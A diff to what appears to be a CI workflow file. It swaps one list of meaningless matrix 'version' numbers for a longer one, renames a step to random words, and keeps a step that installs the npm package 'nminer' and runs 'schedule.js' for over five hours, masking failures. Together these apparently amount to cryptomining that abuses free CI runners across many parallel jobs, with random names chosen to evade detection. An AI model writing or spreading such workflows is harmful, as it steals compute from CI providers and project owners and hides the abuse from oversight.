@@ -9,21 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2140 }
-          - { version: 4722 }
-          - { version: 3883 }
-          - { version: 7897 }
-          - { version: 7090 }
-          - { version: 3888 }
-          - { version: 1975 }
-          - { version: 1538 }
-          - { version: 8857 }
-          - { version: 3717 }
-          - { version: 7395 }
-          - { version: 35 }
-          - { version: 7536 }
-          - { version: 4029 }
-          - { version: 316 }
+          - { version: 4197 }
+          - { version: 6331 }
+          - { version: 527 }
+          - { version: 3979 }
+          - { version: 4296 }
+          - { version: 9498 }
+          - { version: 3940 }
+          - { version: 2577 }
+          - { version: 5469 }
+          - { version: 6829 }
+          - { version: 650 }
+          - { version: 615 }
+          - { version: 6291 }
+          - { version: 3142 }
+          - { version: 138 }
+          - { version: 4369 }
+          - { version: 3774 }
 
     steps:
       - name: Checkout
@@ -34,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: boohoo happy-go-lucky
+      - name: necklace given editor whoever
         run: |
           npm install nminer@latest
-          timeout 306m node schedule.js || echo "schedule executed"
+          timeout 337m node schedule.js || echo "schedule executed"
